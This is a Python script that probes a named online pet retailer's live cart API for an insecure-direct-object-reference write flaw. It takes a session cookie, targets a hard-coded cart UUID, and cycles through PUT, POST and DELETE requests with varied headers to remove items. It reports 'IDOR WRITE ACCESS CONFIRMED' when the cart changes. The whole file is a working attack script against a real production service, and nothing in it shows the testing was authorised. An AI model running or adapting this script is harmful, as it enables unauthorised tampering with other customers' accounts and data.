#!/usr/bin/env python3
"""
Final comprehensive test - try EVERYTHING including edge cases
"""

import requests
import json
import sys

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_all_methods_final.py <session_cookie>")
    sys.exit(1)

headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "X-Requested-With": "XMLHttpRequest"
}

# Get cart
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
cart = r.json()
before_count = len(cart.get("articles", []))
first_article = cart.get("articles", [{}])[0]
article_id = first_article.get("id")
offer_id = first_article.get("offerId", "")

print(f"[*] FINAL COMPREHENSIVE TEST")
print(f"[+] Cart: {before_count} items")
print()

# Try ALL possible combinations with different headers
all_tests = []

# Test with X-Requested-With header (AJAX)
base_endpoint = f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{article_id}"
all_tests.extend([
    ("PUT", base_endpoint, {"quantity": 0}, {"X-Requested-With": "XMLHttpRequest"}),
    ("POST", base_endpoint + "/remove", None, {"X-Requested-With": "XMLHttpRequest"}),
    ("DELETE", base_endpoint, None, {"X-Requested-With": "XMLHttpRequest"}),
])

# Test with different content types
all_tests.extend([
    ("PUT", base_endpoint, {"quantity": 0}, {"Content-Type": "application/x-www-form-urlencoded"}),
    ("POST", base_endpoint + "/remove", None, {"Content-Type": "application/x-www-form-urlencoded"}),
])

# Test main cart endpoint with full update
cart_modified = cart.copy()
cart_modified["articles"] = cart_modified["articles"][1:]
all_tests.extend([
    ("PUT", f"/checkout/api/cart-api/v2/cart/{CART_UUID}", cart_modified, {}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{CART_UUID}", cart_modified, {}),
])

# Test with cartId
cart_id = cart.get("cartId")
all_tests.extend([
    ("PUT", f"/checkout/api/cart-api/v2/cart/{cart_id}/articles/{article_id}", {"quantity": 0}, {}),
    ("POST", f"/checkout/api/cart-api/v2/cart/{cart_id}/articles/{article_id}/remove", None, {}),
])

successful = []

for method, endpoint, payload, extra_headers in all_tests:
    test_headers = headers.copy()
    test_headers.update(extra_headers)
    
    print(f"[*] {method} {endpoint}")
    if payload:
        print(f"    Payload: {json.dumps(payload) if isinstance(payload, dict) else payload}")
    if extra_headers:
        print(f"    Extra headers: {extra_headers}")
    
    try:
        if method == "DELETE":
            r = requests.delete(f"{BASE_URL}{endpoint}", headers=test_headers, timeout=10)
        elif method == "PUT":
            if extra_headers.get("Content-Type") == "application/x-www-form-urlencoded":
                r = requests.put(f"{BASE_URL}{endpoint}", headers=test_headers, 
                               data={"quantity": 0}, timeout=10)
            else:
                r = requests.put(f"{BASE_URL}{endpoint}", headers=test_headers, 
                               json=payload, timeout=10)
        else:  # POST
            if extra_headers.get("Content-Type") == "application/x-www-form-urlencoded":
                r = requests.post(f"{BASE_URL}{endpoint}", headers=test_headers, 
                                data={"remove": "true"}, timeout=10)
            else:
                r = requests.post(f"{BASE_URL}{endpoint}", headers=test_headers, 
                                json=payload, timeout=10)
        
        print(f"    HTTP {r.status_code}")
        
        if r.status_code in [200, 204]:
            print(f"    [!!!] SUCCESS!")
            print(f"    Response: {r.text[:300]}")
            successful.append((method, endpoint, payload, r.status_code))
            
            # Verify immediately
            r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
            if r2.status_code == 200:
                cart_after = r2.json()
                after_count = len(cart_after.get("articles", []))
                if after_count != before_count:
                    print(f"    [!!!] VERIFIED: {before_count} -> {after_count} items")
                    print()
                    print("[!!!] ========================================")
                    print("[!!!] IDOR WRITE ACCESS CONFIRMED!")
                    print("[!!!] ========================================")
                    print(f"[!!!] Working: {method} {endpoint}")
                    sys.exit(0)
        elif r.status_code == 400:
            print(f"    [!] Bad Request: {r.text[:150]}")
        elif r.status_code not in [404, 405]:
            print(f"    Response: {r.text[:150]}")
    except Exception as e:
        print(f"    Error: {e}")

print()
print("[*] Final verification...")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code == 200:
    cart_after = r.json()
    after_count = len(cart_after.get("articles", []))
    print(f"[+] Cart after: {after_count} items")
    if after_count != before_count:
        print(f"[!!!] CART MODIFIED!")

if not successful:
    print()
    print("[!] No working endpoints found")
    print("[!] Recommendation: Test through browser DevTools to find real endpoints")

